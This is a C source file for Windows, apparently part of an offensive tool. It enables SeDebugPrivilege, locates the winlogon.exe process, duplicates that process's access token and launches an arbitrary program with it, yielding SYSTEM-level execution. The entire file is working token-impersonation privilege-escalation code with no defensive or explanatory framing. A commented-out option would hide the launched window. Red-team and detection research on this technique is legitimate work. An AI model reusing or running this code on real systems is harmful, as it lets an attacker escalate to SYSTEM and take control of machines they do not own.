#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include "DebugFunc.h"




BOOL EnableWindowsPrivilege(char* Privilege, HANDLE currentProcess) {
	/* Tries to enable privilege if it is present to the Permissions set. */
	LUID luid;
	TOKEN_PRIVILEGES tp;

	HANDLE currentToken = NULL;
	if (!LookupPrivilegeValueA(NULL, Privilege, &luid))
		return FALSE;

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!OpenProcessToken(currentProcess, TOKEN_ALL_ACCESS, &currentToken))
		return FALSE;
	if (!AdjustTokenPrivileges(currentToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
		return FALSE;
	return TRUE;
}
BOOL CheckWindowsPrivilege(char* Privilege, HANDLE currentProcess) {
	LUID luid;
	PRIVILEGE_SET privs;
	HANDLE hToken;
	BOOL bResult;

	if (!OpenProcessToken(currentProcess, TOKEN_QUERY, &hToken))
		return FALSE;
	if (!LookupPrivilegeValueA(NULL, Privilege, &luid))
		return FALSE;
	privs.PrivilegeCount = 1;
	privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
	privs.Privilege[0].Luid = luid;
	privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
	PrivilegeCheck(hToken, &privs, &bResult);
	return bResult;
}

BOOL SetWindowsPrivilege() {
	HANDLE currentProcess = GetCurrentProcess();
	if (currentProcess == NULL)
		return FALSE;

	if (!EnableWindowsPrivilege(SE_DEBUG_NAME, currentProcess)) {
		PrintDebug("\t[X] Could not enable SeDebugPrivilege!\n");
		return FALSE;
	}
	PrintDebug("\t[+] SeDebugPrivilege privilege set !\n");
	if (!CheckWindowsPrivilege(SE_DEBUG_NAME, currentProcess)) {
		PrintDebug("\t[X] Do not have SeDebugPrivilege!\n");
		return FALSE;

	}
	PrintDebug("\t[+] SeDebugPrivilege privilege set and checked !\n");
	CloseHandle(currentProcess);
	return TRUE;
}







HANDLE GetAccessToken(DWORD pid) {
	HANDLE AccessToken = NULL;

	if (pid != 0) {
		HANDLE currentProcess = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
		if (currentProcess == NULL) {
			PrintDebug("[X] ERROR: Open Process(): %d\n", GetLastError());
			return NULL;
		}
		if (!OpenProcessToken(currentProcess, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &AccessToken)) {
			PrintDebug("[X] ERROR: Open Process Token(): %d\n", GetLastError());
			CloseHandle(currentProcess);
			return NULL;
		}
		CloseHandle(currentProcess);
	}

	return AccessToken;
}



DWORD getPid() {
	DWORD winlogonPID = 0;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot != NULL) {
		PROCESSENTRY32 processEntry;
		processEntry.dwSize = sizeof(PROCESSENTRY32);

		if (Process32First(snapshot, &processEntry)) {
			winlogonPID = processEntry.th32ProcessID;
			while (strcmp(processEntry.szExeFile, "winlogon.exe") != 0 && Process32Next(snapshot, &processEntry))
				winlogonPID = processEntry.th32ProcessID;
		}
		CloseHandle(snapshot);
	}
	return winlogonPID;
}

HANDLE DuplicateWinloginToken(HANDLE pToken) {
	//These are required to call DuplicateTokenEx.
	SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
	TOKEN_TYPE tokenType = TokenPrimary;
	HANDLE pNewToken = NULL;

	if (!DuplicateTokenEx(pToken, MAXIMUM_ALLOWED, NULL, seImpersonateLevel, tokenType, &pNewToken)) {
		PrintDebug("\t[X] ERROR: Could not duplicate process token [%d]\n", GetLastError());
		return NULL;
	}
	PrintDebug("\t[+] Process token has been duplicated.\n");
	return pNewToken;
}

BOOL CreateProcessSystem(LPWSTR programToRun, HANDLE pNewToken) {
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	memset(&si, 0, sizeof(STARTUPINFO));
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_NORMAL; // SW_HIDE
	si.cb = sizeof(STARTUPINFO);
	memset(&pi, 0, sizeof(PROCESS_INFORMATION));

	if (!CreateProcessWithTokenW(pNewToken, LOGON_NETCREDENTIALS_ONLY, programToRun, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
		PrintDebug("\t[X] CreateProcessWithTokenW: %d\n", GetLastError());
		return FALSE;
	}
	PrintDebug("\t[+] Process created: %ws !\n", programToRun);
	return TRUE;
}



BOOL GetSystemPriv(LPWSTR programToRun) {
	DWORD pid = getPid();
	HANDLE pToken;
	HANDLE pNewToken;

	PrintDebug("\t[+] Winlogon Pid: %d\n", pid);
	pToken = GetAccessToken(pid);
	if (pToken == NULL)
		return FALSE;
	pNewToken = DuplicateWinloginToken(pToken);
	if (pNewToken == NULL) {
		CloseHandle(pToken);
		return FALSE;
	}
	if (!CreateProcessSystem(programToRun, pNewToken)) {
		CloseHandle(pNewToken);
		CloseHandle(pToken);
		return FALSE;
	}
	CloseHandle(pNewToken);
	CloseHandle(pToken);
	return TRUE;
}